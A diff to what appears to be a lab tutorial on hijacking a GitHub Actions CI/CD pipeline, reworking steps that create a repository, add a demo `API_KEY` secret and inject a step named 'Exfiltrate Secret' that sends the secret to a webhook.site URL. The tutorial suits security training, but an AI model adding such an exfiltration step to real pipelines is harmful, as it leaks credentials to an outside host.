@@ -17,15 +17,19 @@ Before you begin, make sure you have the following:
   - Use [https://webhook.site](https://webhook.site) to receive the exfiltrated secret.
 - **(Optional)** A GitHub personal access token (PAT) if you prefer pushing via HTTPS with authentication.
 
-## Step 1: Create a Simple GitHub Repo
+## Step 1: Create a simple GitHub repository
+
+Login to your GitHub account and create a private repository named ci-cd-hijack-minimal. Then setup a repository on your local machine using the following commands:
+
 ```bash
-mkdir ci-cd-hijack-minimal && cd ci-cd-hijack-minimal
+mkdir ci-cd-hijack-minimal
+cd ci-cd-hijack-minimal
 echo "This is a test repo." > README.md
 git init
 git add .
 git commit -m "Initial commit"
 ```
-## Step 2: Create a GitHub Actions Workflow
+## Step 2: Create a GitHub Actions workflow
 
 Create the folder:
 ```bash
@@ -54,16 +58,21 @@ jobs:
       run: echo "Build passed!"
 ```
 
-## Step 3: Add a Secret
+## Step 3: Add a secret
 
 Go to your GitHub repo > Settings > Secrets and Variables > Actions, and add:
 
-Name: `API_KEY`
-Value: `minimal_demo_secret_456`
+- Name: `API_KEY`
+- Value: `minimal_demo_secret_456`
 
-## Step 4: Inject the Malicious Line
 
-Now modify the workflow to include your exfiltration step:
+## Step 4: Obtain WebHook URL
+
+Go to [https://webhook.site/](https://webhook.site/) and copy the value shown in Your unique URL
+
+## Step 5: Inject the malicious line
+
+Now modify the workflow to include your exfiltration step (remember to replace `https://webhook.site/your-unique-id` with the URL you copied earlier):
 
 ```yaml
 - name: Exfiltrate Secret
@@ -98,11 +107,7 @@ jobs:
       run: echo "Build passed!"
 ```
 
-## Step 5: Obtain WebHook URL
-
-Go to [https://webhook.site/](https://webhook.site/) and copy the value shown in Your unique URL
-
-## Step 6: Push and Trigger the Workflow
+## Step 6: Push and trigger the workflow
 
 git add .
 git commit -m "Add basic CI workflow"
